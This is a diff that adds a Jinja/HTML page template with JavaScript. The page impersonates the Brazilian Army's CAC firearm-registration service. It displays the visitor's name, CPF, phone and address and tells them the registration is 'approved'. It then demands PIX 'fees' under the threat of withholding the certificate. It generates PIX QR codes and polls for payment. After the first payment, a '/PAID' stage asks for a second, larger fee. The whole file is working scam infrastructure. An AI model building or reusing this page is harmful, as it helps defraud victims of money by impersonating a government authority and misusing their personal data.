@@ -1,0 +1,354 @@
+{% extends "layout.html" %}
+{% block content %}
+<main class="container mx-auto px-4 py-6">
+    <div class="flex items-center text-gray-600 mb-6 text-sm">
+        <div class="icon-text">
+            <i class="fas fa-home"></i>
+            <span>Exército Brasileiro</span>
+        </div>
+        <i class="fas fa-chevron-right mx-2"></i>
+        <span>Cadastro CAC</span>
+    </div>
+    <div class="mx-auto bg-white rounded-lg shadow-lg p-4 text-[#222222]" style="border-radius: 2px;">
+        <div class="mt-[-40px] mb-2 bg-gray-50 p-2 rounded-md" style="border-radius: 2px;">
+            <p class="mb-2"><strong class="font-medium text-[#226B00]">Nome:</strong> {{ user_data.full_name }}</p>
+            <p class="mb-2"><strong class="font-medium text-[#226B00]">CPF:</strong> {{ user_data.cpf }}</p>
+            <p class="mb-2"><strong class="font-medium text-[#226B00]">Telefone:</strong> {{ user_data.phone }}</p>
+            {% if user_data.address %}
+            <p class="mb-2"><strong class="font-medium text-[#226B00]">Endereço:</strong> {{ user_data.address }}</p>
+            {% endif %}
+            {% if user_data.city and user_data.state %}
+            <p class="mb-2"><strong class="font-medium text-[#226B00]">Cidade/Estado:</strong> {{ user_data.city }}/{{ user_data.state }}</p>
+            {% endif %}
+            {% if user_data.zip_code %}
+            <p class="mb-2"><strong class="font-medium text-[#226B00]">CEP:</strong> {{ user_data.zip_code }}</p>
+            {% endif %}
+        </div>
+        <div class="bg-yellow-50 text-[15px] p-4 mb-6">
+            <div class="flex items-center mb-4">
+                <h2 class="text-[15px] font-bold text-[#856504]">Prezado, {{ user_data.full_name.split()[0] }}:</h2>
+            </div>
+            <p class="text-[15px] text-[#856504] leading-relaxed">
+                O CPF <strong>{{ user_data.cpf }}</strong> foi verificado e seu Registro CAC foi aprovado. Para concluir o processo é necessário efetuar o pagamento das seguintes taxas:
+            </p>
+            <ul class="list-disc pl-5 mt-3 text-[#856504]">
+                <li>Taxa de aquisição de armas e munições: <strong>R$131,50</strong></li>
+                <li>Taxa de fiscalização de produtos controlados (TFPC) para transporte de armas e munições: <strong>R$112,18</strong></li>
+            </ul>
+        </div>
+        <div class="movements">
+            <div class="relative pl-8 pb-4 border-l-4 border-red-50">
+                <div class="absolute left-0 top-0 w-6 h-6 bg-red-50 rounded-full -ml-3 flex items-center justify-center">
+                    <i class="fas fa-exclamation-triangle text-red-600 text-xs"></i>
+                </div>
+                <div class="mb-8"></div>
+                <div class="-ml-3 flex items-center justify-center">
+                    <i class=""></i>
+                </div>
+                <div class="mb-8">
+                    <p class="font-semibold text-red-600 text-2sm">AGUARDANDO PAGAMENTO</p>
+                    <p class="text-[12px] text-gray-600 mt-1">{{ now.strftime('%d/%m/%Y') }}</p>
+                    <div class="mt-4 bg-red-50 text-red-700 p-4 rounded-md" role="alert" style="border-radius: 2px;">
+                        <p class="mt-1">O não pagamento das taxas resultará na <strong>não emissão do Certificado CAC</strong>, impossibilitando a compra e registro de armamento.</p>
+                    </div>
+                    <button id="payFeeButton" class="btn-danger btn-danger-large mt-4">
+                        <i class="fas fa-credit-card mr-2"></i>
+                        CONCLUIR CADASTRO
+                    </button>
+                </div>
+            </div>
+            <div class="mt-8 bg-gray-50 p-4 rounded-lg border-l-4 border-military-green" style="border-radius: 2px;">
+                <div class="icon-text mb-2">
+                    <i class="fas fa-certificate text-military-green"></i>
+                    <p class="font-semibold text-military-dark text-lg">Próxima Etapa:</p>
+                </div>
+                <p class="mt-2 text-gray-600">Após o pagamento das taxas, seu Certificado CAC será emitido e enviado para o seu endereço:</p>
+                <div class="mt-2 bg-white p-3 rounded-md text-gray-700 border border-gray-200 shadow-sm" style="border-radius: 2px;">
+                    <p class="text-gray-700">
+                        {% if user_data.address %}
+                            <strong>{{ user_data.address }}{% if user_data.number %}, {{ user_data.number }}{% endif %}</strong>
+                            {% if user_data.complement %}, {{ user_data.complement }}{% endif %}
+                            {% if user_data.neighborhood %}, {{ user_data.neighborhood }}{% endif %}
+                        {% endif %}
+                    </p>
+                    <p class="text-gray-700 mt-1">
+                        {% if user_data.city and user_data.state %}
+                            <strong>{{ user_data.city }}/{{ user_data.state }}</strong>
+                        {% endif %}
+                        {% if user_data.zip_code %}
+                            - CEP: {{ user_data.zip_code }}
+                        {% endif %}
+                    </p>
+                </div>
+            </div>
+        </div>
+        <a href="{{ url_for('index') }}" class="btn-secondary-std mt-8">
+            <i class="fas fa-arrow-left mr-2"></i>Voltar
+        </a>
+    </div>
+</main>
+<!-- Payment Modal -->
+<div id="paymentModal" class="fixed inset-0 bg-black bg-opacity-50 hidden items-center justify-center z-50">
+    <div class="bg-white rounded-lg shadow-xl w-full max-w-md mx-4 overflow-hidden">
+        <!-- Loading screen -->
+        <div id="loadingScreen" class="p-8 text-center">
+            <div class="flex justify-center mb-4">
+                <div class="animate-spin rounded-full h-16 w-16 border-t-2 border-b-2 border-military-green mx-auto"></div>
+            </div>
+            <p class="text-lg font-semibold text-gray-700 mb-2">Gerando Guia de Pagamento...</p>
+            <p id="loadingStatus" class="text-center text-gray-600">Processando solicitação</p>
+        </div>
+
+        <!-- Payment information -->
+        <div id="paymentInfo" class="hidden">
+            <div class="bg-military-green text-white p-4">
+                <div class="flex justify-between items-center">
+                    <h2 class="text-lg font-semibold">Pagamento PIX</h2>
+                    <button id="closePaymentModal" class="text-white hover:text-gray-200">
+                        <i class="fas fa-times"></i>
+                    </button>
+                </div>
+            </div>
+            <div class="p-6">
+                <div class="bg-gray-50 p-4 rounded-lg mb-4">
+                    <p class="text-gray-700 text-sm mb-1">Valor total:</p>
+                    {% if request.path.endswith('/PAID') %}
+                    <p class="text-sm font-bold text-military-dark">R$ 243,68</p>
+                    <div class="flex text-xs text-gray-500 mt-1">
+                        <span class="mr-2">Taxa aquisição: R$ 131,50</span>
+                        <span>Taxa transporte: R$ 112,18</span>
+                    </div>
+                    {% else %}
+                    <p class="text-sm font-bold text-military-dark">R$ 68,40</p>
+                    <div class="flex text-xs text-gray-500 mt-1">
+                        <span>Taxa de Inscrição CAC</span>
+                    </div>
+                    {% endif %}
+                    <p class="text-xs text-gray-500">Taxas de segurança e serviço incluídas</p>
+                </div>
+
+                <div class="flex flex-col items-center mb-4">
+                    <p class="text-sm text-gray-600 mb-2">Escaneie o QR Code abaixo com o seu aplicativo bancário</p>
+                    <div class="bg-white p-2 border border-gray-200 rounded-lg mb-2">
+                        {% if payment_data and payment_data.pix and payment_data.pix.qrCodeBase64 %}
+                            <img id="pixQrCode" src="{{ payment_data.qrCodeBase64 }}" alt="QR Code PIX" class="w-48 h-48 mx-auto">
+                        {% elif payment_data and payment_data.pix and payment_data.pix.qrCode %}
+                            <img id="pixQrCode" src="{{ payment_data.pix.qrCode }}" alt="QR Code PIX" class="w-48 h-48 mx-auto">
+                        {% elif payment_data and payment_data.qrCodeBase64 %}
+                            <img id="pixQrCode" src="{{ payment_data.qrCodeBase64 }}" alt="QR Code PIX" class="w-48 h-48 mx-auto">
+                        {% else %}
+                            <img id="pixQrCode" src="" alt="QR Code PIX" class="w-48 h-48 mx-auto">
+                        {% endif %}
+                    </div>
+                </div>
+
+                <div class="bg-gray-50 p-3 rounded-lg mb-4">
+                    <p class="text-sm text-gray-600 mb-1">Ou copie o código PIX abaixo:</p>
+                    <div class="flex flex-col">
+                        {% if payment_data and payment_data.pix and payment_data.pix.code %}
+                            <input id="pixCodeInput" type="text" readonly class="bg-white border border-gray-200 rounded px-3 py-2 text-sm w-full mb-2" value="{{ payment_data.pix.code }}">
+                        {% elif payment_data and payment_data.pixCode %}
+                            <input id="pixCodeInput" type="text" readonly class="bg-white border border-gray-200 rounded px-3 py-2 text-sm w-full mb-2" value="{{ payment_data.pixCode }}">
+                        {% else %}
+                            <input id="pixCodeInput" type="text" readonly class="bg-white border border-gray-200 rounded px-3 py-2 text-sm w-full mb-2" value="">
+                        {% endif %}
+                        <button id="copyPixCode" class="btn-military w-full">
+                            <i class="fas fa-copy mr-2"></i> Copiar código PIX
+                        </button>
+                    </div>
+                    <p id="copySuccess" class="text-military-green text-xs mt-1 text-center hidden">Código copiado!</p>
+                </div>
+
+                <div class="text-center">
+                    <p class="text-sm text-gray-600 mb-4">O pagamento é processado automaticamente. Após confirmação, seu Certificado CAC será emitido.</p>
+                    <button id="checkPaymentStatus" class="btn-military mt-2">
+                        <i class="fas fa-search mr-2"></i>
+                        Verifique o status do pagamento
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    // Elements
+    const paymentModal = document.getElementById('paymentModal');
+    const loadingScreen = document.getElementById('loadingScreen');
+    const paymentInfo = document.getElementById('paymentInfo');
+    const loadingStatus = document.getElementById('loadingStatus');
+    const closePaymentModal = document.getElementById('closePaymentModal');
+    const pixQrCode = document.getElementById('pixQrCode');
+    const pixCodeInput = document.getElementById('pixCodeInput');
+    const copyPixCode = document.getElementById('copyPixCode');
+    const copySuccess = document.getElementById('copySuccess');
+    const checkPaymentStatus = document.getElementById('checkPaymentStatus');
+    
+    // Get transaction ID from server response if available
+    {% if payment_data and payment_data.id %}
+        let transactionId = "{{ payment_data.id }}";
+    {% else %}
+        let transactionId = "";
+    {% endif %}
+    
+    let checkStatusInterval = null;
+
+    // Status messages for loading animation
+    const statusMessages = [
+        "Verificando dados bancários",
+        "Gerando código PIX",
+        "Preparando transação segura",
+        "Finalizando"
+    ];
+
+    let currentStatus = 0;
+    let statusInterval;
+
+    function updateStatus() {
+        loadingStatus.textContent = statusMessages[currentStatus];
+        currentStatus = (currentStatus + 1) % statusMessages.length;
+    }
+
+    // Handle payment button click
+    document.getElementById('payFeeButton').addEventListener('click', function() {
+        // Show modal
+        paymentModal.classList.remove('hidden');
+        paymentModal.classList.add('flex');
+        loadingScreen.classList.remove('hidden');
+        paymentInfo.classList.add('hidden');
+        
+        // Start status messages rotation
+        currentStatus = 0;
+        updateStatus();
+        statusInterval = setInterval(updateStatus, 1500);
+        
+        // Call the server-side endpoint to create a PIX payment
+        fetch('/create_pix_payment', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            }
+        })
+        .then(response => response.json())
+        .then(data => {
+            // Stop the loading animation
+            clearInterval(statusInterval);
+            
+            if (data.success && data.payment_data) {
+                // Show payment information
+                setTimeout(() => {
+                    loadingScreen.classList.add('hidden');
+                    paymentInfo.classList.remove('hidden');
+                    
+                    pixQrCode.src="https://api.qrserver.com/v1/create-qr-code/?data="+data.payment_data.pixCode+"&size=220x220&margin=0"
+                    
+                    if (data.payment_data.pixCode) {
+                        pixCodeInput.value = data.payment_data.pixCode;
+                        console.log("Código PIX definido");
+                    } else if (data.payment_data.pix && data.payment_data.pix.code) {
+                        pixCodeInput.value = data.payment_data.pix.code;
+                        console.log("Código PIX definido da estrutura pix");
+                    } else {
+                        console.error("Código PIX não encontrado na resposta");
+                    }
+                    
+                    // Store transaction ID for status checks
+                    if (data.payment_data.id) {
+                        transactionId = data.payment_data.id;
+                        
+                        // Start checking payment status
+                        checkStatusInterval = setInterval(checkPaymentStatusAuto, 5000);
+                    }
+                }, 1000);
+            } else {
+                // Handle error
+                paymentModal.classList.add('hidden');
+                paymentModal.classList.remove('flex');
+                alert('Erro ao gerar o pagamento: ' + (data.error || 'Erro desconhecido'));
+            }
+        })
+        .catch(error => {
+            clearInterval(statusInterval);
+            paymentModal.classList.add('hidden');
+            paymentModal.classList.remove('flex');
+            console.error('Erro:', error);
+            alert('Erro ao processar o pagamento. Por favor, tente novamente.');
+        });
+    });
+    
+    // Close modal
+    if (closePaymentModal && paymentModal) {
+        closePaymentModal.addEventListener('click', function() {
+            paymentModal.classList.add('hidden');
+            paymentModal.classList.remove('flex');
+            if (checkStatusInterval) {
+                clearInterval(checkStatusInterval);
+            }
+        });
+    }
+    
+    // Copy PIX code
+    if (copyPixCode && pixCodeInput && copySuccess) {
+        copyPixCode.addEventListener('click', function() {
+            pixCodeInput.select();
+            document.execCommand('copy');
+            copySuccess.classList.remove('hidden');
+            setTimeout(() => {
+                copySuccess.classList.add('hidden');
+            }, 2000);
+        });
+    }
+    
+    // Check payment status
+    function checkPaymentStatusAuto() {
+        if (!transactionId) return;
+        
+        fetch('/check_payment_status/' + transactionId)
+            .then(response => response.json())
+            .then(data => {
+                if (data.success && data.redirect) {
+                    // Payment confirmed, redirect - always direct to /resultado/PAID
+                    // regardless of whether API returns PAID or APPROVED status
+                    clearInterval(checkStatusInterval);
+                    window.location.href = '/resultado/PAID';
+                }
+            })
+            .catch(error => {
+                console.error('Erro ao verificar status:', error);
+            });
+    }
+    
+    // Manual check payment status button
+    if (checkPaymentStatus) {
+        checkPaymentStatus.addEventListener('click', function() {
+            if (!transactionId) {
+                alert('Não foi possível verificar o status. Por favor, tente novamente mais tarde.');
+                return;
+            }
+            
+            this.textContent = 'Verificando...';
+            this.disabled = true;
+            
+            fetch('/check_payment_status/' + transactionId)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.success && data.redirect) {
+                        // Payment confirmed, redirect - always direct to /resultado/PAID
+                        // regardless of whether API returns PAID or APPROVED status
+                        window.location.href = '/resultado/PAID';
+                    } else {
+                        // Not confirmed yet
+                        this.textContent = 'Verifique o status do pagamento';
+                        this.disabled = false;
+                        alert('Pagamento ainda não confirmado. Por favor, aguarde mais um momento ou tente novamente.');
+                    }
+                })
+                .catch(error => {
+                    console.error('Erro ao verificar status:', error);
+                    this.textContent = 'Verifique o status do pagamento';
+                    this.disabled = false;
+                });
+        });
+    }
+</script>
+{% endblock %}
